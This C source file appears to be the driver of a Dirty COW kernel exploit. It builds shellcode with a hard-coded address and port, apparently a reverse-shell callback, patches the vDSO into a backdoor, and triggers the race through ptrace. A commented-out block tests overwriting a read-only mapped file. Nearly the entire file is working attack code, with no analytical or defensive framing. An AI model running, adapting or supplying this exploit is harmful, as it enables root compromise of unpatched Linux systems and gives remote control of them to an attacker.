#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "exploit.h"
#include "dirtycow.h"
#include "vdso_backdoor.h"

//int main() {
//    char *filename = "/foo";
//    int fd = open(filename, O_RDONLY);
//    struct stat st;
//    fstat(fd, &st);
//
//    unsigned char *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
//
//    printf("map %p\n", map);
//    printf("content: %s\n", map);
//
//    struct mem_vec vec;
//    vec.address = map;
//    vec.data = "fuck";
//    vec.size = 4;
//    exploit(&vec, 1,  PRTACE_POKEDATA);
//
//    return 0;
//}

int main() {
    unsigned int shellcode_size;
    unsigned char *shellcode;
    build_shellcode(&shellcode, &shellcode_size, 0x9f3010ac, 0x3930);

    struct mem_vec * vecs;
    unsigned int size;
    get_vdso_patch_vec(&vecs, &size, shellcode, shellcode_size);

//    for(int i=0;i<size;i++) {
//        printf("vecs[%d]: \n", i);
//        for(int j=0;j<vecs[i].size;j++){
//            printf("%02x", vecs[i].data[j]);
//        }
//        printf("\n");
//    }

    exploit(vecs, size, PTRACE);
}